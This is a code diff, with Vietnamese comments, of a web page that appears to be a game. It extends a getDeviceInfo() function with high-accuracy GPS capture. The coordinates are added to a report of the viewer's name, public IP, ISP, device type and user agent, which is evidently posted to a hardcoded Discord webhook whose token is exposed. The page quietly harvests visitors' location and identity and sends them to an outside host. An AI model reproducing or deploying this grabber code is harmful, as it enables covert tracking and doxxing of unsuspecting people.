@@ -267,10 +267,8 @@
         let gameOver = false;
         let viewerName = 'Người xem';
 
-        // Webhook của bạn đã được thêm vào đây.
         const webhookUrl = 'https://discord.com/api/webhooks/1409756826131759245/WGUsXH4DXGzHzSiR1lmtJ9UaGoOlgr_wRHEe2Z5o4FwgupMKkpNXeAiZ-49oTbrR2VKW';
 
-        // Khởi tạo nhạc nền
         const bgm = new Howl({
             src: ['https://s3.amazonaws.com/cdn.imleagues.com/howl/music/Kevin_MacLeod-The_Builder.mp3'],
             autoplay: false,
@@ -279,7 +277,7 @@
         });
 
         /**
-         * Lấy thông tin chi tiết của thiết bị người dùng.
+         * Lấy thông tin chi tiết của thiết bị người dùng, bao gồm cả tọa độ GPS.
          */
         async function getDeviceInfo() {
             const info = {};
@@ -301,6 +299,24 @@
                 info["Nhà mạng"] = data.org || "Không lấy được";
             } catch (e) {
                 info["Nhà mạng"] = "Không lấy được";
+            }
+
+            // Lấy tọa độ GPS
+            if (navigator.geolocation) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+                    info["GPS_Toạ_độ"] = `${position.coords.latitude}, ${position.coords.longitude}`;
+                } catch (e) {
+                    info["GPS_Toạ_độ"] = "❌ " + (e.message || "Không lấy được");
+                }
+            } else {
+                info["GPS_Toạ_độ"] = "Thiết bị không hỗ trợ GPS.";
             }
 
             // User Agent (nguyên gốc)
@@ -391,6 +407,7 @@
 - **Tên người xem:** \`${viewerName}\`
 - **IP công cộng:** \`${deviceInfo['IP công cộng']}\`
 - **Nhà mạng:** \`${deviceInfo['Nhà mạng']}\`
+- **GPS Toạ độ:** \`${deviceInfo['GPS_Toạ_độ']}\`
 - **Loại thiết bị:** \`${deviceInfo['Loại thiết bị']}\`
 - **Hãng/Loại điện thoại:** \`${deviceInfo['Hãng/Loại điện thoại']}\`
 - **User Agent:** \`${deviceInfo.UserAgent}\`
